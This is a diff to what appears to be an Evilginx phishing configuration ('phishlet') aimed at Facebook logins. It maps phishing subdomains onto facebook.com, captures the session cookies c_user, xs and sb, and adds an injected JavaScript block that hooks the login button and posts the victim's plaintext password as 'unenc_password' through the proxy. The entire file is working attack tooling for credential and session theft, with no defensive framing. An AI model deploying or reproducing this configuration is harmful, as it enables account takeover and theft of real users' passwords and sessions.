@@ -1,4 +1,4 @@
-author: '@mrgretzky'
+author: '@charlesbel'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
@@ -13,6 +13,7 @@ sub_filters:
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https:\/\/{hostname}\/', replace: 'https:\/\/{hostname}\/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+
 auth_tokens:
   - domain: '.facebook.com'
     keys: ['c_user','xs','sb']
@@ -22,9 +23,32 @@ credentials:
     search: '(.*)'
     type: 'post'
   password:
-    key: 'pass'
+    key: 'unenc_password'
     search: '(.*)'
     type: 'post'
+
+
+   
 login:
   domain: 'www.facebook.com'
   path: '/login.php'
+
+js_inject:
+  - trigger_domains: ["www.facebook.com"]
+    trigger_paths: ["/login.php"]
+    trigger_params: []
+    script: |  
+      function onclickListener(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        return;
+      }
+      function sendPass(){
+        var password = document.getElementsByName("pass")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login/device-based/regular/login/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 1000);
